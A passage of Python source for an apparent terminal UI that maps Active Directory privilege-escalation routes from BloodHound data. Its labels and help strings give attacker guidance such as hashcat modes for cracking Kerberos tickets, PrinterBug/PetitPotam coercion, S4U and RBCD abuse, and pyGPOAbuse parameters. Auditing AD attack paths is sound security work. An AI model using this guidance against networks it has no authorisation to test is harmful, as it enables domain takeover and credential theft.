        out.sort(key=lambda x: (-x[1], short(g, x[0]).lower()))
        return out

    def compose(self) -> ComposeResult:
        # each route family is its OWN tree, stacked in one scroll box — so the sections
        # read as separate, unconnected routes rather than branches off a shared root.
        with VerticalScroll(id="escscroll"):
            for tid in ("esc_own", "esc_cred", "esc_acl", "esc_lat", "esc_foot"):
                t = Tree("", id=tid)
                t.show_root = True
                yield t

    def on_mount(self):
        g, priv = self.g, self.app.priv
        self.query_one("#escscroll").border_title = (
            "escalation routes — Space/Enter drop down · Enter drills · Esc back")

        roast_priv = [n.sid for n in g.nodes.values() if n.kind == "User"
                      and (n.p("hasspn") or n.p("serviceprincipalnames")) and n.sid.rsplit("-", 1)[-1] != "502"
                      and (n.sid in priv or g.is_highvalue(n.sid))]
        dcsync = set()
        for d in g.domain_sids:
            for (s, l) in g.rctrl.get(d, []):
                if (l == "DCSync" or l in bh.REPL_RIGHTS) and not bh._is_default_dcsync(g, s):
                    dcsync.add(s)
        laps = sorted({r for r, _c in bh._laps_readers(g)})
        esc_abusers = sorted({ab for (_c, ab, _t) in g.esc_branches if g.nodes.get(ab)})
        kerb = [n.sid for n in g.nodes.values() if n.kind == "User"
                and (n.p("hasspn") or n.p("serviceprincipalnames")) and n.sid.rsplit("-", 1)[-1] != "502"]
        asrep = [n.sid for n in g.nodes.values() if n.kind == "User" and n.p("dontreqpreauth")]
        lateral = self._danger_holders(exclude=set())        # full set (shared below)
        starts = self._acl_starts()
        reach = self._owned_reach()                          # sid -> [(owned name, src)]

        # --- FROM WHAT YOU OWN — the wins your owned set already holds -------------
        own = self.query_one("#esc_own", Tree).root
        own.data = None
        own.set_label(banner(f"{OWNED} FROM WHAT YOU OWN — your privesc surface", bg="dark_green"))
        if not self.app.owned:
            own.add_leaf(Text("mark footholds with Ctrl+O (and kerberoastable/other accounts "
                              "as you crack them) — what they already grant collects here",
                              style="grey50")).allow_expand = False
        else:
            def mine(sids):                                  # held via an owned identity
                return [s for s in sids if s in reach]
            lat_mine = [s for s, _n in lateral if s in reach]
            # NB: no separate "LAPS readers you hold" category — ReadLAPSPassword is a
            # dangerous right, so LAPS-reader groups already appear under the one below.
            self._category(own, "DCSync you hold", mine(sorted(dcsync)), "bold green", expand=True, tag_owned=True)
            self._category(own, "Kerberoastable priv / DA you control", mine(roast_priv), "bold green", expand=True, tag_owned=True)
            self._category(own, "ADCS ESC you can abuse", mine(esc_abusers), "bold green", expand=True, tag_owned=True)
            self._category(own, "Dangerous rights you hold (take over other objects — incl. LAPS read)", lat_mine, "bold green", expand=True, tag_owned=True)
            if not own.children:
                own.add_leaf(Text("your owned set holds no direct credential/ACL win yet — "
                                  "work the domain-wide routes below", style="grey50")).allow_expand = False
        own.expand()

        # --- CREDENTIAL WINS ---
        cred = self.query_one("#esc_cred", Tree).root
        cred.data = None
        cred.set_label(banner("CREDENTIAL WINS — no ACL chain (usually the real path)", bg="dark_red"))
        self._category(cred, "Kerberoastable privileged / DA accounts", roast_priv, "bold red", expand=True, tag_owned=True)
        self._category(cred, "DCSync-capable (non-default)", sorted(dcsync), "bold red", expand=True, tag_owned=True)
        self._category(cred, "LAPS readers → local admin", laps, "yellow", expand=True, tag_owned=True)
        self._category(cred, "ADCS ESC abusers → domain", esc_abusers, "bold red", expand=True, tag_owned=True)
        if not cred.children:
            cred.add_leaf(Text("none", style="grey50")).allow_expand = False
        cred.expand()

        # --- ACL START POINTS → high-value ---
        acl = self.query_one("#esc_acl", Tree).root
        acl.data = None
        acl.set_label(banner(f"ACL START POINTS → high-value, fewest hops first  ({len(starts)})", bg="grey30"))
        if not starts:
            acl.add_leaf(Text("none reach high-value by ACL alone — use the credential wins above",
                              style="grey50")).allow_expand = False
        for s, hops, tgt in starts[:INLINE_CAP]:
            line = self._line(s)
            line.append(f"   {hops} hop{'s' if hops != 1 else ''} → {STAR} {short(g, tgt)}",
                        style="bold red")
            self._owned_tag(line, s, reach)               # ✓ when you already hold this start
            child = acl.add(line, data={"sid": s, "anc": frozenset({s}), "loaded": True})
            self._add_path_hops(child, s, tgt)
            child.expand()
        if len(starts) > INLINE_CAP:
            acl.add(Text(f"... +{len(starts) - INLINE_CAP} more (open list)", style="grey50"),
                    data={"list": ("ACL start points", [s for s, _h, _t in starts])}).allow_expand = False
        acl.expand()

        # --- DANGEROUS RIGHTS — every principal that can take objects over by ACL ---
        # the FULL list; owned-reachable rows sort to the top and are flagged ✓ in place.
        lat = self.query_one("#esc_lat", Tree).root
        lat.data = None
        lat.set_label(banner(f"DANGEROUS RIGHTS — groups / users that can take over other "
                             f"objects  ({len(lateral)})", bg="grey30"))
        lat.add_leaf(Text("holds a dangerous right (GenericAll / WriteDacl / ForceChangePassword / "
                          "ReadLAPSPassword …) over other objects — yours first, then widest",
                          style="grey62")).allow_expand = False
        if not lateral:
            lat.add_leaf(Text("none", style="grey50")).allow_expand = False
        # ones you already hold (reachable from owned) first, then by most control
        lateral = sorted(lateral, key=lambda x: (x[0] not in reach, -x[1], short(g, x[0]).lower()))
        for s, ntgt in lateral[:INLINE_CAP]:
            line = self._line(s)
            line.append(f"   controls {ntgt} object{'s' if ntgt != 1 else ''}", style="yellow")
            self._owned_tag(line, s, reach)          # name the owned member, if any
            child = lat.add(line, data={"sid": s, "anc": frozenset({s})})
            child.allow_expand = self._expandable(s, frozenset({s}))
        if len(lateral) > INLINE_CAP:
            lat.add(Text(f"... +{len(lateral) - INLINE_CAP} more (open list)", style="grey50"),
                    data={"list": ("dangerous rights", [s for s, _n in lateral])}).allow_expand = False
        lat.expand()

        # --- FOOTHOLDS any domain user can grab ---
        foot = self.query_one("#esc_foot", Tree).root
        foot.data = None
        foot.set_label(banner("FOOTHOLDS ANY DOMAIN USER CAN GRAB", bg="grey30"))
        self._category(foot, "Kerberoastable", kerb, "yellow", tag_owned=True)
        self._category(foot, "AS-REP roastable", asrep, "yellow", tag_owned=True)
        if not foot.children:
            foot.add_leaf(Text("none", style="grey50")).allow_expand = False
        foot.expand()

        self.app.set_detail(intro=Text(
            "Top section = what your owned set already holds; the sections below are the "
            "domain-wide routes, with rows you hold flagged ✓. Space/Enter drops a node "
            "down, Enter on a principal drills into its own attack tree.", style="grey62"))
        focus = "#esc_own" if self.app.owned else "#esc_cred"
        self.query_one(focus, Tree).focus()


# --------------------------------------------------------------------------- #
# kerberoastable users — a drillable tree (each user drops down to SPNs + path)
# --------------------------------------------------------------------------- #
class KerbView(AttackTreeBase):
    """Kerberoastable users as a drillable tree instead of a flat list: each account
    drops down to its SPNs and its own route to high-value; privileged (crack = instant
    admin) accounts sort first and are flagged."""

    def _ctx_label(self):
        return "kerberoastable"

    def _populate(self, node):
        data = node.data or {}
        if data.get("kerb") and not data.get("loaded"):
            data["loaded"] = True
            g, sid = self.g, data["sid"]
            n = g.nodes.get(sid)
            spns = n.p("serviceprincipalnames") or [] if n else []
            if isinstance(spns, str):
                spns = [spns]
            enc = bh._A_plain(bh._roast_enc_tag(n)[0]) if n else "?"
            node.add_leaf(Text(f"enc: {enc}  (hashcat -m 13100 RC4 / 19600-19700 AES)",
                               style="grey62")).allow_expand = False
            for sp in spns[:8]:
                node.add_leaf(Text(f"SPN  {sp}", style="cyan")).allow_expand = False
            if len(spns) > 8:
                node.add_leaf(Text(f"… +{len(spns) - 8} more SPNs", style="grey50")).allow_expand = False
            # its own route to high-value, nested, if any
            if not g.is_highvalue(sid):
                reach = g.reachable(sid)
                hvs = [h for h in reach if h != sid and g.is_highvalue(h)]
                if hvs:
                    tgt = min(hvs, key=lambda h: reach[h][0])
                    hdr = node.add(Text(f"→ route to {STAR} {g.is_highvalue(tgt)} "
                                        f"({reach[tgt][0]} hops)", style="red"))
                    hdr.allow_expand = True
                    self._add_path_hops(hdr, sid, tgt)
            return
        super()._populate(node)

    def on_mount(self):
        g, priv = self.g, self.app.priv
        tree = self.query_one("#tree", Tree)
        tree.border_title = "kerberoastable users — Space/Enter drop down · i info · Esc back"
        root = tree.root
        root.set_label(Text("kerberoastable users — request the SPN ticket, crack it offline",
                            style="bold"))
        root.data = None
        users = [n.sid for n in g.nodes.values() if is_kerberoastable(g, n.sid)]
        users.sort(key=self._list_sort_key)
        if not users:
            root.add_leaf(Text("none — no user accounts advertise an SPN", style="grey50"))
        for s in users:
            line = self._line(s)
            if is_roast_admin(g, s, priv):
                line.append("  crack = instant admin", style="bold red")
            svcs = spn_services(g.nodes[s])
            if svcs:
                line.append("   SPN: " + ", ".join(svcs[:4]), style="grey62")
            child = root.add(line, data={"sid": s, "anc": frozenset({s}), "kerb": True})
            child.allow_expand = True                 # always drillable: SPNs + its path
        root.expand()
        self.app.set_detail(intro=Text(
            f"{len(users)} kerberoastable account(s). Drop one down for its SPNs + "
            "route to high-value; i for full node info.", style="grey62"))
        tree.focus()


# --------------------------------------------------------------------------- #
# delegation — split by TYPE (unconstrained / constrained / RBCD), drillable
# --------------------------------------------------------------------------- #
class DelegationView(AttackTreeBase):
    """Kerberos delegation grouped by its kind so it's obvious which is which: each
    type carries a one-line abuse note, then its principals as drillable nodes."""

    def _ctx_label(self):
        return "delegation"

    def _princ(self, parent, sids, note):
        sids = list(dict.fromkeys(s for s in sids if self.g.nodes.get(s)))
        if note:
            parent.add_leaf(Text(note, style="grey62")).allow_expand = False
        for s in sorted(sids, key=self._list_sort_key)[:INLINE_CAP]:
            c = parent.add(self._line(s), data={"sid": s, "anc": frozenset({s})})
            c.allow_expand = self._expandable(s, frozenset({s}))
        if len(sids) > INLINE_CAP:
            parent.add(Text(f"... +{len(sids) - INLINE_CAP} more (open list)", style="grey50"),
                       data={"list": ("delegation", sids)}).allow_expand = False

    def on_mount(self):
        g = self.g
        tree = self.query_one("#tree", Tree)
        tree.border_title = "delegation by type — Space/Enter drop down · Enter drills · Esc back"
        root = tree.root
        root.set_label(Text("Kerberos delegation in this domain", style="bold"))
        root.data = None

        unc = [s for s, n in g.nodes.items() if n.p("unconstraineddelegation")]
        unc_nondef = [s for s in unc if not bh._is_default_unconstrained(g, s)]
        unc_def = [s for s in unc if bh._is_default_unconstrained(g, s)]
        constr = [s for s, n in g.nodes.items()
                  if n.p("trustedtoauth") or n.p("allowedtodelegate") or n.p("msds-allowedtodelegateto")]
        rbcd = sorted({tgt for tgt, lst in g.rctrl.items()
                       for (_s, l) in lst if l == "AllowedToAct" and g.nodes.get(tgt)})

        u = root.add(Text(f"Unconstrained delegation  ({len(unc)})", style="bold red"), expand=True)
        self._princ(u, unc_nondef,
                    "UNCONSTRAINED: coerce a target (PrinterBug / PetitPotam) to authenticate here, "
                    "then pull its TGT from memory. Coerce a DC → DCSync. (Own the host first.)")
        if unc_def:
            d = u.add(Text(f"default — expected on DCs  ({len(unc_def)})", style="grey50"))
            self._princ(d, unc_def, "")
        if not unc:
            u.add_leaf(Text("none", style="grey50")).allow_expand = False

        c = root.add(Text(f"Constrained delegation  ({len(constr)})", style="yellow"),
                     expand=bool(constr))
        self._princ(c, constr,
                    "CONSTRAINED: with this principal's creds, S4U2Self + S4U2Proxy to impersonate "
                    "any user to the SPN(s) it is trusted to delegate to.")
        if not constr:
            c.add_leaf(Text("none", style="grey50")).allow_expand = False

        r = root.add(Text(f"Resource-based constrained (RBCD)  ({len(rbcd)})", style="yellow"),
                     expand=bool(rbcd))
        self._princ(r, rbcd,
                    "RBCD: these objects let another principal act on their behalf. Control that "
                    "principal (or write msDS-AllowedToActOnBehalfOfOtherIdentity) → S4U → SYSTEM here.")
        if not rbcd:
            r.add_leaf(Text("none", style="grey50")).allow_expand = False

        root.expand()
        self.app.set_detail(intro=Text(
            "Delegation grouped by type. Enter on a principal drills into its attack tree.",
            style="grey62"))
        tree.focus()


# --------------------------------------------------------------------------- #
# domain summary — interactive: every finding category is a drillable node
# --------------------------------------------------------------------------- #
class SummaryView(AttackTreeBase):
    """The domain summary laid out like the other menus — each finding is a category of
    drillable principals instead of a static text report."""

    def _ctx_label(self):
        return "summary"

    def compose(self) -> ComposeResult:
        with VerticalScroll(id="summscroll"):
            main = Tree("", id="tree")
            main.show_root = True
            yield main
            dq = Tree("", id="dqtree")
            dq.show_root = True
            yield dq

    def on_mount(self):
        g = self.g
        tree = self.query_one("#tree", Tree)
        self.query_one("#summscroll").border_title = (
            "domain summary — Space/Enter drop down · Enter drills · Esc back")
        root = tree.root
        kinds = defaultdict(int)
        for n in g.nodes.values():
            kinds[n.kind] += 1
        edges = sum(len(v) for v in g.ctrl.values())
        root.set_label(Text(f"{g.domain_name or '?'}  —  {kinds['User']} users · {kinds['Group']} groups · "
                            f"{kinds['Computer']} computers · {edges} edges", style="bold cyan"))
        root.data = None

        # actual Domain/Enterprise Admins group membership (RID 512/519), matching the
        # CLI summary — not the broader effectively-admin set, which sweeps in the DCs.
        da = set()
        for sid, n in g.nodes.items():
            if n.kind == "Group" and sid.rsplit("-", 1)[-1] in ("512", "519"):
                for m in bh._expand_members(g, sid):
                    mn = g.nodes.get(m)
                    if mn and mn.kind in ("User", "Computer"):
                        da.add(m)
        da = sorted(da)
        kerb = [n.sid for n in g.nodes.values() if n.kind == "User"
                and (n.p("hasspn") or n.p("serviceprincipalnames")) and n.sid.rsplit("-", 1)[-1] != "502"]
        asrep = [n.sid for n in g.nodes.values() if n.kind == "User" and n.p("dontreqpreauth")]
        dcsync = set()
        for d in g.domain_sids:
            for (s, l) in g.rctrl.get(d, []):
                if (l == "DCSync" or l in bh.REPL_RIGHTS) and not bh._is_default_dcsync(g, s):
                    dcsync.add(s)
        laps = sorted({r for r, _c in bh._laps_readers(g)})
        esc_abusers = sorted({ab for (_c, ab, _t) in g.esc_branches if g.nodes.get(ab)})
        gpo_ctrl = set()
        for gpo in g.gpo_by_guid.values():
            for (s, l) in g.rctrl.get(gpo, []):
                if l in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns", "WriteGPLink") \
                        and g.nodes.get(s) and not bh._is_admin(g, s):
                    gpo_ctrl.add(s)
        unc = [s for s, n in g.nodes.items()
               if n.p("unconstraineddelegation") and not bh._is_default_unconstrained(g, s)]

        dcs = [s for s, n in g.nodes.items() if n.kind == "Computer" and bh._is_dc(g, s)]
        dq = g.dq or {}
        dqtree = self.query_one("#dqtree", Tree)
        if dq.get("notes") or dq.get("collectors"):
            col = ", ".join(dq.get("collectors", [])) or "unknown collector"
            dqn = dqtree.root
            dqn.set_label(Text(f"DATA QUALITY — {col}  ({len(dq.get('notes', []))} note(s))",
                               style="bold yellow" if dq.get("notes") else "grey62"))
            dqn.data = None
            if dq.get("notes"):
                dqn.expand()
            for note in dq.get("notes", []):
                dqn.add_leaf(Text("⚠ " + note, style="yellow")).allow_expand = False
            if dq.get("laps_noreader"):
                self._category(dqn, "LAPS computers with no visible reader",
                               dq["laps_noreader"], style="yellow")
        else:
            dqtree.display = False
        self._category(root, "Domain / Enterprise Admins", da, style="bold red", expand=True)
        self._category(root, "Domain controllers", sorted(dcs), style="bold red", expand=True)
        self._category(root, "Kerberoastable users", kerb, style="bold red", expand=True)
        self._category(root, "AS-REP roastable users", asrep, style="yellow")
        self._category(root, "ADCS ESC abusers → domain", esc_abusers, style="bold red", expand=True)
        self._category(root, "Non-default DCSync rights", sorted(dcsync), style="bold red", expand=True)
        self._category(root, "LAPS readers (non-admin → local admin)", laps, style="yellow")
        self._category(root, "Non-admin GPO control", sorted(gpo_ctrl), style="bold red", expand=True)
        self._category(root, "Non-default unconstrained delegation", unc, style="bold red")
        self._category(root, "Computers with a DA/EA session", [c for c, _u in bh._admin_sessions(g)],
                       style="bold red", expand=True)
        dl = bh._domain_lines(g)
        if len(dl) > 1:
            dn = root.add(Text(f"Domains ({len(dl)})", style="bold cyan"), expand=True)
            for txt, is_root in dl:
                dn.add_leaf(Text(txt, style="bold magenta" if is_root else "grey85")).allow_expand = False
        tl = bh._trust_lines(g)
        if tl:
            tn = root.add(Text(f"Domain trusts ({len(tl)})", style="bold red" if any(b for _t, b in tl)
                               else "yellow"), expand=True)
            for txt, bad in tl:
                tn.add_leaf(Text(txt, style="red" if bad else "grey70")).allow_expand = False

        if isinstance(g.maq, int):
            root.add_leaf(Text(f"MachineAccountQuota = {g.maq}"
                              + ("  — any user can add machines (RBCD / Shadow-Creds)" if g.maq > 0 else ""),
                              style="red" if g.maq > 0 else "grey62")).allow_expand = False

        root.expand()
        self.app.set_detail(intro=Text(
            "Every finding is a drillable node — Enter on a principal opens its attack tree.",
            style="grey62"))
        tree.focus()


# --------------------------------------------------------------------------- #
# MachineAccountQuota — an attack-tree-style view (owners -> their machines)
# --------------------------------------------------------------------------- #
class MaqView(Vertical):
    """MAQ laid out like the attack tree: the quota up top, then every user that
    owns machine accounts as an expandable node with its computers under it."""

    def compose(self) -> ComposeResult:
        tree = Tree("", id="maqtree")
        tree.show_root = True
        yield tree

    @property
    def g(self):
        return self.app.g

    def _owned(self, sid):
        return f"  {OWNED_TAG}" if sid in self.app.owned else ""

    def on_mount(self):
        g = self.g
        tree = self.query_one("#maqtree", Tree)
        tree.border_title = "machine accounts — Space/Enter drop down · Enter on a machine drills · Esc back"
        maq = g.maq if isinstance(g.maq, int) else None
        head = Text("MachineAccountQuota  ", style="bold")
        if maq is None:
            head.append("unknown", style="grey62")
        else:
            head.append(str(maq), style="bold red" if maq > 0 else "grey70")
        tree.root.set_label(head)
        tree.root.data = None
        if maq and maq > 0:
            tree.root.add_leaf(Text(f"any authenticated user can add up to {maq} machine account(s) "
                                    "-> RBCD / Shadow Creds -> SYSTEM", style="red"))
        elif maq == 0:
            tree.root.add_leaf(Text("quota 0 — standard users cannot add machines", style="grey70"))

        by = defaultdict(list)
        for owner, comp in bh._user_owned_computers(g):
            by[owner].append(comp)
        cat = tree.root.add(Text(f"users who own machine accounts  ({len(by)})", style="bold"),
                            expand=True)
        if not by:
            cat.add_leaf(Text("none — no user-owned computer objects in this collection", style="grey50"))
        for owner in sorted(by, key=lambda s: (-len(by[s]), short(g, s).lower())):
            comps = list(dict.fromkeys(by[owner]))
            lab = ntext(g, owner, priv=self.app.priv)
            lab.append(self._owned(owner), style="bold green")
            lab.append(f"   owns {len(comps)}", style="cyan")
            onode = cat.add(lab, data={"sid": owner, "comps": comps})
            onode.allow_expand = True
        tree.root.expand()
        self.app.set_detail(intro=Text(
            "Pick an owner or machine — Enter drills into its attack tree.", style="grey62"))
        tree.focus()

    def _cline(self, sid):
        g, t = self.g, ntext(self.g, sid, priv=self.app.priv)
        t.append(self._owned(sid), style="bold green")
        n = g.nodes.get(sid)
        if n and n.kind == "Computer" and bh._computer_value(g, sid, self.app.priv)[0]:
            t.append("  key target", style="bold red")
        return t

    def on_tree_node_expanded(self, event: Tree.NodeExpanded):
        node = event.node
        data = node.data or {}
        if data.get("loaded") or "comps" not in data:
            return
        data["loaded"] = True
        g = self.g
        for c in sorted(data["comps"],
                        key=lambda s: (not bh._is_dc(g, s),
                                       not bh._computer_value(g, s, self.app.priv)[0],
                                       short(g, s).lower())):
            node.add(self._cline(c), data={"sid": c}).allow_expand = False

    def on_tree_node_highlighted(self, event: Tree.NodeHighlighted):
        data = event.node.data or {}
        if data.get("sid"):
            self.app.set_detail(data["sid"])

    def on_tree_node_selected(self, event: Tree.NodeSelected):
        node = event.node
        data = node.data or {}
        if node.allow_expand:
            return        # Textual's own Enter/Space toggles it; NodeExpanded populates
        if data.get("sid"):
            self.app.open_start(data["sid"])

    def _cursor_sid(self):
        node = self.query_one("#maqtree", Tree).cursor_node
        return (node.data or {}).get("sid") if node else None


# --------------------------------------------------------------------------- #
# a scrollable pane of a reused CLI analysis — left/right scroll long lines
# --------------------------------------------------------------------------- #
class TextPane(VerticalScroll):
    BINDINGS = [
        Binding("left", "scroll_left", "←", show=False),
        Binding("right", "scroll_right", "→", show=False),
        Binding("up", "scroll_up", "↑", show=False),
        Binding("down", "scroll_down", "↓", show=False),
    ]

    def __init__(self, title, producer):
        super().__init__()
        self._title = title
        self.producer = producer

    def compose(self) -> ComposeResult:
        yield Static(id="body")

    def on_mount(self):
        self.can_focus = True
        self.border_title = f"{self._title}  —  ←→ scroll · Esc back"
        self.query_one("#body", Static).update(self.producer())
        self.focus()


def _gpo_sysvol_guid(n):
    """The GPO's policy / SYSVOL GUID — the folder name under \\...\\SysVol\\...\\Policies\\,
    which is what pyGPOAbuse / SharpGPOAbuse need for -gpo-id. This is NOT the node objectid:
    BloodHound keys GPOs by their objectGUID, a different value. We pull it from the
    gpcpath / gPCFileSysPath property. Returned without braces (the form the tools expect)."""
    import re
    path = str(n.p("gpcpath") or n.p("gpcfilesyspath") or "")
    m = re.search(r"\{?([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-"
                  r"[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\}?\s*$", path)
    return m.group(1) if m else None


# --------------------------------------------------------------------------- #
# interactive node-info overlay — a drillable tree, Esc closes, never changes start
# --------------------------------------------------------------------------- #
class NodeInfoView(AttackTreeBase):
    """Read-only interactive node detail: the node, where it leads (shortest path), its
    groups and what it controls — each related node drillable into ITS own info. The
    bottom pane carries the full properties. Opening another node here never re-roots
    the main attack tree / changes the start."""

    def __init__(self, sid):
        super().__init__()
        self.sid = sid

    def _ctx_label(self):
        return short(self.g, self.sid)

    def _group_dangers(self, gs):
        """The dangerous control rights a group grants (what makes it high-priv)."""
        rmap = self._rights_map(gs, frozenset({gs}))
        return [r for r in rmap if r in bh._DANGER or r in bh.REPL_RIGHTS or r == "DCSync"
                or r in ("ReadLAPSPassword", "ReadGMSAPassword")]

    def _memgroup_line(self, sid, gs):
        """The 'in <GROUP>' line with a high-priv indicator when the group grants rights
        (high-value groups are already flagged ◆ by ntext)."""
        line = self._line(gs, "MemberOf")
        dangers = self._group_dangers(gs)
        if dangers:
            # no leading ◆ here — ntext already marks a high-value group with one
            line.append("   grants " + ", ".join(dangers[:3])
                        + (" …" if len(dangers) > 3 else ""), style="bold red")
        return line

    def _add_facts(self, root, sid):
        """A compact 'key facts' section at the top of node info — the headline detail
        (flags, SPNs, pwd age, where it leads) surfaced right in the tree."""
        g, n = self.g, self.g.nodes.get(sid)
        if not n:
            return
        facts = root.add(Text("key facts", style="bold"), expand=True)
        facts.add_leaf(Text(f"SID: {sid}", style="grey70")).allow_expand = False   # certipy -sid, etc.
        if n.kind == "GPO":
            gpo_guid = bh._gpo_sysvol_guid(n)
            if gpo_guid:
                facts.add_leaf(Text(f"SYSVOL GUID (pyGPOAbuse -gpo-id): {gpo_guid}",
                                    style="bold cyan")).allow_expand = False
            else:
                facts.add_leaf(Text("SYSVOL GUID: gpcpath not collected — get the GPO's cn "
                                    "via LDAP for -gpo-id", style="grey50")).allow_expand = False
        # identity — sam, display name, title, email, description (what the account IS)
        for key, lab in (("samaccountname", "sam"), ("displayname", "display name"),
                         ("title", "title"), ("email", "email")):
            v = n.p(key)
            if v in (None, ""):
                continue
            facts.add_leaf(Text(f"{lab}: {v}", style="grey70")).allow_expand = False
        desc = n.p("description")
        if desc:
            facts.add_leaf(Text(f"description: {str(desc).replace(chr(10), ' ')[:120]}",
                                style="italic grey70")).allow_expand = False
        why = why_highvalue(sid)
        if why:
            facts.add_leaf(Text(f"{STAR} {why}", style="red")).allow_expand = False
        tags = node_tags(g, sid).plain.strip()
        if tags:
            facts.add_leaf(Text(tags, style="yellow")).allow_expand = False
        if is_kerberoastable(g, sid):
            svcs = spn_services(n)
            enc = bh._A_plain(bh._roast_enc_tag(n)[0])
            facts.add_leaf(Text(f"kerberoastable · SPN: {', '.join(svcs[:5]) if svcs else '?'} · enc {enc}",
                                style="purple")).allow_expand = False
        if n.kind in ("User", "Computer"):
            for key, lab in (("enabled", "enabled"), ("pwdlastset", "pwd last set"),
                             ("lastlogontimestamp", "last logon")):
                v = n.p(key)
                if v in (None, ""):
                    continue
                if key in ("pwdlastset", "lastlogontimestamp"):
                    v = bh._fmt_ts(v)
                facts.add_leaf(Text(f"{lab}: {v}", style="grey70")).allow_expand = False
        # where it leads / reach
        if not g.is_highvalue(sid):
            _size, _hv, best = bh._user_profile(g, sid)
            if best:
                facts.add_leaf(Text(f"reaches {STAR} {best[0]} in {best[1]} hop(s)",
                                    style="red")).allow_expand = False
        n_groups, n_rights, n_targets, n_reach = bh._control_counts(g, sid)
        if n_groups:
            facts.add_leaf(Text(f"member of {n_groups} group(s)",
                                style="grey70")).allow_expand = False
        if n_rights:
            facts.add_leaf(Text(f"holds {n_rights} control right(s) over {n_targets} object(s)"
                                " (direct + via groups)", style="grey70")).allow_expand = False
        else:
            facts.add_leaf(Text("holds no control rights (direct or via groups)",
                                style="grey50")).allow_expand = False
        if n_reach:
            facts.add_leaf(Text(f"reach: {n_reach} node(s) by chaining memberships and rights",
                                style="grey50")).allow_expand = False
        inbound = g.rctrl.get(sid, [])
        if inbound:
            facts.add_leaf(Text(f"controlled by {len(inbound)} principal(s)",
                                style="grey70")).allow_expand = False

    def _add_owned_path(self, root, sid):
        """'Path from owned': the shortest chain from the nearest owned principal to this
        node — or, when there is none, the nearest principals that CAN reach it."""
        g, app = self.g, self.app
        if sid in app.owned:
            root.add_leaf(Text(f"{OWNED} you own this", style=OWNED_STYLE)).allow_expand = False
            return
        if not app.owned:
            root.add_leaf(Text("Path from owned: mark footholds with ^o to check reachability",
                               style="grey50")).allow_expand = False
            return
        reach = app.owned_reach()
        path = g.path_in(reach, sid)
        if path and len(path) > 1:
            hdr = root.add(Text(f"{CHECK} Path from owned: {OWNED} {short(g, path[0][0])} → "
                                f"{len(path) - 1} step{'s' if len(path) != 2 else ''}",
                                style="bold green"), expand=True)
            hdr.allow_expand = True
            hdr.data = {"sid": path[0][0], "anc": frozenset({path[0][0]}), "loaded": True}
            self._add_path_hops(hdr, path[0][0], sid, path=path)
            return
        back = g.reached_by(sid)
        near = sorted((s for s in back if s != sid and g.nodes.get(s)),
                      key=lambda s: (back[s], short(g, s).lower()))
        hdr = root.add(Text("✗ No path from your owned principals", style="bold red"), expand=True)
        if not near:
            hdr.add_leaf(Text("nothing in the collected graph controls this node",
                              style="grey50")).allow_expand = False
            return
        hdr.add_leaf(Text(f"{len(near)} principal(s) can reach it — compromise one of these "
                          f"(nearest first):", style="grey70")).allow_expand = False
        for s in near[:INLINE_CAP]:
            line = self._line(s)
            line.append(f"   {back[s]}h to target", style="grey50")
            hdr.add(line, data={"sid": s, "anc": frozenset({s})}).allow_expand = False
        if len(near) > INLINE_CAP:
            hdr.add(Text(f"... +{len(near) - INLINE_CAP} more (open list)", style="grey50"),
                    data={"list": (f"Who can reach {short(g, sid)}", near)}).allow_expand = False

    def _on_sid_select(self, sid):
        self.app.show_node_info(sid)                  # drill in place, within the box

    def on_tree_node_selected(self, event: Tree.NodeSelected):
        data = event.node.data or {}
        if "list" in data:
            title, sids = data["list"]
            self.app.show_list(f"{self._ctx_label()} — {title}", sids)
            return
        if event.node.allow_expand:
            return                                   # let Enter/Space toggle; populate on expand
        if data.get("sid"):
            self._on_sid_select(data["sid"])

    def _populate(self, node):
        data = node.data or {}
        if data.get("memgroup") and not data.get("loaded"):
            data["loaded"] = True
            g, gs = self.g, data["sid"]
            anc = data.get("anc", frozenset({gs}))
            n_rights = self._add_rights(node, self._rights_map(gs, anc), anc)   # high-priv rights it grants
            # let the chain continue through nested groups too
            for d in sorted((d for (d, l) in g.ctrl.get(gs, [])
                             if l == "MemberOf" and d not in anc), key=lambda s: short(g, s).lower()):
                c = node.add(self._line(d, "MemberOf"), data={"sid": d, "anc": anc | {d}, "memgroup": True})
                c.allow_expand = True
            if not node.children:
                mem = sum(1 for m in bh._expand_members(g, gs)
                          if g.nodes.get(m) and g.nodes[m].kind in ("User", "Computer"))
                node.add_leaf(Text(f"(no control rights of its own · {mem} member(s))",
                                   style="grey50")).allow_expand = False
            return
        super()._populate(node)

    def on_mount(self):
        g, sid = self.g, self.sid
        tree = self.query_one("#tree", Tree)
        tree.border_title = f"node info: {short(g, sid)}  —  Enter/Space drill · i info · y copy · Esc back"
        tree.root.set_label(self._line(sid))
        tree.root.data = {"sid": sid, "anc": frozenset({sid}), "loaded": True}
        self._add_owned_path(tree.root, sid)
        self._add_facts(tree.root, sid)
        self._add_shortest_path(tree.root, sid)
        # rights the node itself holds directly (not via a group)
        direct = self._rights_map(sid, frozenset({sid}))
        if direct:
            dcat = tree.root.add(Text("Rights it holds directly", style="bold"), expand=True)
            self._add_rights(dcat, direct, frozenset({sid}))
        # a GROUP's members (users/computers) — who is in it, as a drop-down
        if g.nodes.get(sid) and g.nodes[sid].kind == "Group":
            members = [m for m in bh._expand_members(g, sid)
                       if g.nodes.get(m) and g.nodes[m].kind in ("User", "Computer")]
            self._category(tree.root, "Members (users / computers)", members, expand=True)
        # EVERY group this principal is in (direct + nested) — each a drop-down that
        # expands to the high-priv rights that group grants; high-priv groups are flagged.
        groups = [s for s in bh._principal_closure(g, sid)
                  if s != sid and (g.nodes.get(s) and g.nodes[s].kind == "Group")]
        if groups:
            # high-priv groups (grant dangerous rights / high-value) first
            groups.sort(key=lambda s: (not (self._group_dangers(s) or g.is_highvalue(s)),
                                       self._list_sort_key(s)))
            cat = tree.root.add(Text(f"Member of (all groups)  ({len(groups)})", style="bold"), expand=True)
            for gs in groups:
                gnode = cat.add(self._memgroup_line(sid, gs),
                                data={"sid": gs, "anc": frozenset({sid, gs}), "memgroup": True})
                gnode.allow_expand = True                 # always a drop-down
        via = {}
        for (s, l) in g.rctrl.get(sid, []):
            via.setdefault(s, [])
            if l not in via[s]:
                via[s].append(l)
        self._category(tree.root, "Controlled by", list(via), via=via)
        tree.root.expand()                        # groups show collapsed with a ▶ drop-down
        self._detail(sid)
        tree.focus()


class NodeInfoScreen(Screen):
    """Full-screen overlay hosting an interactive NodeInfoView. Esc pops back."""
